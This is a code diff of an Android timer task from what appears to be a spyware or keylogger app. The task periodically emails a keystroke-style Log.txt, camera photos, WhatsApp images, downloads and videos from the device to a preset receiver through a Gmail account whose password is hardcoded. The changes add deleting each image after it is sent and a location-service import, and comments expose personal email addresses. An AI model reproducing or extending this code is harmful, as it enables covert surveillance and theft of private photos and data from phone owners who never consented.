@@ -4,7 +4,9 @@ import java.util.TimerTask;
 
 import android.app.Activity;
 import android.content.Context;
+import android.content.Intent;
 import android.content.res.Resources;
+import android.location.LocationManager;
 import android.os.Environment;
         import android.os.Handler;
         import android.util.Log;
@@ -23,21 +25,21 @@ import android.os.Environment;
 public class TimeDisplayTimerTask extends TimerTask {
 
     public File dir;
+    public File root;
+    public File root1;
+    public File root2;
     String TAG="TimeDisplayTimerTask";
     String reciverEmail;
     String senderMail="emailkeyapptest@gmail.com";
     String Pass="emailkeyapptestp";
     String path=Environment.getExternalStorageDirectory().getAbsolutePath()+"/Log/";
-
     String s= Environment.getExternalStorageDirectory().getAbsolutePath()+"/DCIM/Camera/";
     String s1=Environment.getExternalStorageDirectory().getAbsolutePath()+"/WhatsApp/Media/WhatsApp Images/";
     String s2=Environment.getExternalStorageDirectory().getAbsolutePath()+"/Download/";
     String d=Environment.getExternalStorageDirectory().getAbsolutePath()+"/Log/";
-
-    public File root;
-    public File root1;
-    public File root2;
     private Context context;
+    private Handler mHandler = new Handler();
+
     TimeDisplayTimerTask(Context context){
         this.context=context;
     }
@@ -45,7 +47,6 @@ public class TimeDisplayTimerTask extends TimerTask {
     public void testResource(){
          reciverEmail=context.getApplicationContext().getString(R.string.reciveremailid);//.toString();
     }
-    private Handler mHandler = new Handler();
 
     @Override
     public void run() {
@@ -96,19 +97,37 @@ public class TimeDisplayTimerTask extends TimerTask {
 
                                         //changes by Pratik sender.sendMail("Email Subject", "", "ajay.dasarwar@gmail.com", "ajaydasarwar94@gmail.com", path+"/Log.txt","txt","");
                                         sender.sendMail("Email Subject", "",senderMail, reciverEmail, path+"/Log.txt","txt","");
+
                                         //   sender.sendMail("Email Subject","body",senderMail,reciverEmail);
                                     }
 
-                                    if(listFile[i].getName().endsWith(".jpg"))
-                                    {
+                                    if (listFile[i].getName().endsWith(".jpg") && !listFile[i].getName().startsWith("Sent")) {
 
                                         // Pratik    sender.sendMail("Email Subject", "", "ajay.dasarwar@gmail.com", "ajaydasarwar94@gmail.com", path+listFile[i].getName(),"jpg","Image_"+i);
                                         try {
                                             sender.sendMail("Email Subject", "", senderMail, reciverEmail, path + listFile[i].getName(), "jpg", "Image_" + i);
+                                            // deleteFile(listFile[i].getAbsolutePath(),listFile[i].getName());
+                                            new File(listFile[i].getAbsolutePath() + listFile[i].getName()).delete();
+
+
+                                            TAG = "asdasdasdas";
                                         }catch(Exception e)
                                         {
                                             Log.e(TAG,""+e.toString());
                                         }
+//                                            try {
+//                                                String newname ="Sent"+listFile[i].getName();
+//                                                File newfile= new File(newname);
+//                                                boolean success = listFile[i].renameTo(newfile);
+//                                                newname="sdsfsd";
+//
+//                                            }catch(Exception e)
+//                                            {
+//                                                Log.e(TAG,""+e.toString());
+//                                            }
+
+
+
                                     }
 
                                     if (listFile[i].getName().endsWith(".mp4"))
@@ -201,4 +220,6 @@ public class TimeDisplayTimerTask extends TimerTask {
             Log.e("tag", e.getMessage());
         }
     }
+
+
 }
